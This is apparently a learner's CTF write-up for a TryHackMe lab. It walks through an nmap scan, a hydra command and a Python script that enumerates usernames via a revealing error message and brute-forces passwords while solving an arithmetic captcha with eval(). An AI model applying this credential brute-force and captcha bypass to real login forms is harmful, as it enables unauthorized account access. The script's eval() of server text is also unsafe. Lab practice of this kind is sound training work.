# Capture
> https://tryhackme.com/room/capture

I downloaded the zip file that contains the login usernames and password that will be used to brurteforce into the login form !

## Nmap
```bash
nmap -sS -Pn [ip]

PORT     STATE SERVICE VERSION
80/tcp   open  http
```

I opened the website and its a login page, tried the usual default usernames and passwords. I noticed that it does say if the username exists or not!


## Hydra

```bash
hydra -L usernames.txt -P passwords.txt "http-post-form://10.10.224.246/login:username=^USER^&password=^PASS^:Error"
```

I get the 'Too many bad login attempts' error message with a mathematical Captcha, for this I need to build a script!.


## Script
For writting the script i used the below walkthrough to guide me in writting and understanding the process:
- [l1asis](https://github.com/l1asis/thm-writeups/blob/main/Capture/Capture.md)
- [BabdCatha](https://github.com/BabdCatha/Capture/blob/main/capture_username.py)
- [Anthony J. Saab](https://blog.anthonyjsaab.com/writeup-for-tryhackmes-capture-room)

Things i kept in mind while trying to build the script in python:
1. Finding the captcha [regex will be used]
2. Solving the captcha [using eval function in python]

### Reading the files
First I need to read the files to retrieve the usernames and passwords. When using the read function its important to add the splitlines. I learned the hard way why its important.
```python
## opening the username.txt to get the users
with open('usernames.txt', 'r') as file:
    usernames = file.read().splitlines()

## opening the passwords.txt to get the password
with open('passwords.txt', 'r') as file:
    passwords = file.read().splitlines()
```


### Requesting 
I made the function 'send_request' to send a request to the server for authentication with the username, password and captcha as None. Captcha is none cause by default there is no captcha in the first few attempts then it starts asking for it. if I do get the captcha then I add it as an argument in the request.
```python
def send_request(username, password, captcha=None):
    data = {
    "username":username,
    "password":password
    }
    # if I get captcha
    if captcha:
        data.update({"captcha":captcha})

    response = requests.post(url=url, data=data)
    return response
```
### Solving Captcha function
This part solves my first concern, the regex expression is used to find captcha string in the html server reponse and the output will be used in the solve captcha functino. The function solve_captcha takes in the reponse, finds the captcha then returns the solved answer to be passed into the request.

```python
# Regular expression to find captcha string in the html server response
regex = re.compile(r"(\d+\s[+*/-]\s\d+)\s\=\s\?")

# solving captcha using eval
def solve_captcha(response):
    captcha = re.findall(regex, response.text)[0]
    return eval(captcha)
```

### Checking if user already exists
I created the get_user function to get the existing user before start bruteforcing the password, this helps by not wasting time. First I sent a request with each user and password as "None" since I only care about the username. I call the solve_captcha function and pass the response as an argument. After solving the captcha I send another request with the same user in loop and check if the user is valid. If the username exists it will return to be used for the next step finding the password.

```python
def get_user():
    for user in usernames:
        response = send_request(user, "None")
        captcha = str(solve_captcha(response))
        data = {
        "username":user,
        "password":'test',
        "captcha":captcha
        }
        response = requests.post(url=url, data=data)
        valid = not re.search(r'The user (.*?) does not exist', str(response.content))
        if valid:
            print(f"[+] Found username : {user}")
            return user
```

### Finding the password!
The Attack function starts by calling the get_user function, After I pass the user as an argument for the send_request function. After solving the captcha I send another request with the valid user but with different password in a loop till the correct password is found!


```python
def attack():
    user = get_user()
    response = send_request(user, "None")
    captcha = str(solve_captcha(response))
    for password in passwords:
        response = send_request(user, password, captcha)
        valid = not re.search(r'Invalid password for user', str(response.content))
        if valid:
            print(f"[+] Found username : {user}")

        # give the previous captcha
        if not "Invalid password" in response.text:
            print(f"[+] Success! Username:{user} Password:{password}")
        # but what if its error? means captcha not working !
        else:
            captcha = solve_captcha(response)
```

## Final words
This was annoying to write specially since i dont fully get the Regular expression module is confusing. Using the search function solved the issue were if not does not exist in content brute force password does not recognize the valid username.
